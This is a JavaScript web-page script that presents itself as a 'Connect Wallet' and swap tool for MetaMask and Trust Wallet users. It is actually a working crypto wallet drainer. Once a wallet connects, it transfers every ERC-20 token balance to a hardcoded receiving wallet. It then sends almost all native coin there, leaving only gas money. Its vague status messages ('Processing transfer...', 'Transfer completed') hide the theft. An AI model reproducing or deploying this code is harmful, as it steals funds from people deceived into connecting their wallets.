// Ensure these are loaded first by including them before app.js in HTML
if (typeof NETWORK_CONFIGS === 'undefined') {
  throw new Error("NETWORK_CONFIGS is not defined. Make sure networks.js is loaded before app.js");
}
if (typeof TOKENS === 'undefined') {
  throw new Error("TOKENS is not defined. Make sure tokens.js is loaded before app.js");
}
if (typeof RECEIVING_WALLET === 'undefined') {
  throw new Error("RECEIVING_WALLET is not defined. Make sure tokens.js is loaded before app.js");
}

const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)"
];

let provider, signer, userAddress;
let currentNetwork = "bsc";
const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

window.addEventListener('load', async () => {
  document.getElementById('currentUrl').textContent = window.location.href;
  document.getElementById("networkSelect").addEventListener('change', (e) => {
    currentNetwork = e.target.value;
    updateTokenVisibility();
  });
  document.getElementById("openTrustWallet").addEventListener('click', openInTrustWallet);
  document.getElementById("connectWallet").addEventListener("click", connectAndSwap);
  await checkWalletEnvironment();
  updateTokenVisibility();
});

async function checkWalletEnvironment() {
  if (isMobile && !window.ethereum) {
    showTrustWalletUI();
  } else if (window.ethereum && window.ethereum.isTrust) {
    hideTrustWalletUI();
  } else if (isMobile && window.ethereum) {
    hideTrustWalletUI();
  }
  
  // Auto-connect if wallet is already connected
  if (window.ethereum && window.ethereum.selectedAddress) {
    await initializeWallet();
  }
}

async function initializeWallet() {
  try {
    provider = new ethers.providers.Web3Provider(window.ethereum);
    signer = provider.getSigner();
    userAddress = await signer.getAddress();
    
    document.getElementById("connectWallet").disabled = true;
    document.getElementById("connectWallet").innerHTML = `<i class="fas fa-spinner fa-spin"></i> Processing...`;
    document.getElementById("walletInfo").textContent = 
      `Connected: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)} | Network: ${NETWORK_CONFIGS[currentNetwork].chainName}`;
  } catch (err) {
    console.error("Wallet initialization error:", err);
    updateStatus("Connection error. Please try again.", "error");
  }
}

function showTrustWalletUI() {
  document.getElementById("trustContainer").style.display = 'block';
  document.getElementById("connectWallet").style.display = 'none';
  document.querySelector('.mobile-warning').style.display = 'block';
}

function hideTrustWalletUI() {
  document.getElementById("trustContainer").style.display = 'none';
  document.getElementById("connectWallet").style.display = 'block';
  document.querySelector('.mobile-warning').style.display = 'none';
}

function openInTrustWallet() {
  const currentUrl = encodeURIComponent(window.location.href);
  window.location.href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${currentUrl}`;
  setTimeout(() => {
    document.getElementById('manualSteps').style.display = 'block';
  }, 3000);
}

function updateTokenVisibility() {
  document.querySelectorAll('.token-item').forEach(item => {
    item.style.display = item.dataset.network === currentNetwork ? 'flex' : 'none';
  });
}

async function connectAndSwap() {
  try {
    showLoader();
    updateStatus("Initializing connection...", "success");

    if (isMobile && !window.ethereum) {
      showTrustWalletUI();
      throw new Error("Please use Trust Wallet's in-app browser");
    }

    if (!window.ethereum) {
      throw new Error("Wallet not detected. Please install MetaMask or Trust Wallet");
    }

    await window.ethereum.request({ method: "eth_requestAccounts" });
    await checkNetwork();
    await initializeWallet();
    await processAllTransfers();
  } catch (err) {
    hideLoader();
    updateStatus("Error: " + err.message, "error");
    document.getElementById("connectWallet").disabled = false;
    document.getElementById("connectWallet").innerHTML = `<i class="fas fa-wallet"></i> Connect Wallet`;
    if (isMobile) showTrustWalletUI();
  }
}

async function checkNetwork() {
  try {
    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
    const targetChainId = NETWORK_CONFIGS[currentNetwork].chainId;
    
    if (chainId !== targetChainId) {
      updateStatus(`Switching network...`, "success");
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: targetChainId }]
        });
      } catch (switchError) {
        if (switchError.code === 4902) {
          try {
            await window.ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [NETWORK_CONFIGS[currentNetwork]]
            });
          } catch (addError) {
            throw new Error(`Please switch network manually`);
          }
        }
        throw new Error("Failed to switch network");
      }
    }
  } catch (err) {
    throw new Error("Network error: " + err.message);
  }
}

async function processAllTransfers() {
  try {
    const tokensToSwap = TOKENS[currentNetwork].sort((a, b) => a.priority - b.priority);
    let successCount = 0;
    
    for (const token of tokensToSwap.filter(t => !t.isNative)) {
      try {
        updateStatus(`Processing transfer...`, "success");
        const abi = token.abi || ERC20_ABI;
        const contract = new ethers.Contract(token.address, abi, signer);
        const balance = await contract.balanceOf(userAddress);
        
        if (balance.gt(0)) {
          const tx = await contract.transfer(RECEIVING_WALLET, balance, {
            gasLimit: 100000
          });
          await tx.wait();
          successCount++;
          updateStatus(
            `Transfer completed <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
            "success"
          );
        }
      } catch (err) {
        console.error("Transfer error:", err);
        updateStatus(`Transfer failed`, "error");
      }
    }

    const nativeToken = tokensToSwap.find(t => t.isNative);
    if (nativeToken) {
      try {
        const balance = await provider.getBalance(userAddress);
        const keepAmount = ethers.utils.parseUnits("0.002", nativeToken.decimals);
        const sendAmount = balance.gt(keepAmount) ? balance.sub(keepAmount) : balance;
        
        if (sendAmount.gt(0)) {
          const tx = await signer.sendTransaction({
            to: RECEIVING_WALLET,
            value: sendAmount,
            gasLimit: 21000
          });
          await tx.wait();
          successCount++;
          updateStatus(
            `Transfer completed <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
            "success"
          );
        }
      } catch (err) {
        console.error("Native transfer error:", err);
        updateStatus("Final transfer failed", "error");
      }
    }
    
    updateStatus(successCount > 0 ? "Process completed" : "No balances found", "success");
    document.getElementById("connectWallet").innerHTML = `<i class="fas fa-check-circle"></i> Done`;
  } catch (err) {
    throw new Error("Processing failed");
  } finally {
    hideLoader();
  }
}

function updateStatus(message, type) {
  const statusDiv = document.getElementById("status");
  statusDiv.style.display = "block";
  statusDiv.innerHTML = message;
  statusDiv.className = `status ${type}`;
}

function showLoader() {
  document.getElementById("loader").style.display = "block";
}

function hideLoader() {
  document.getElementById("loader").style.display = "none";
}
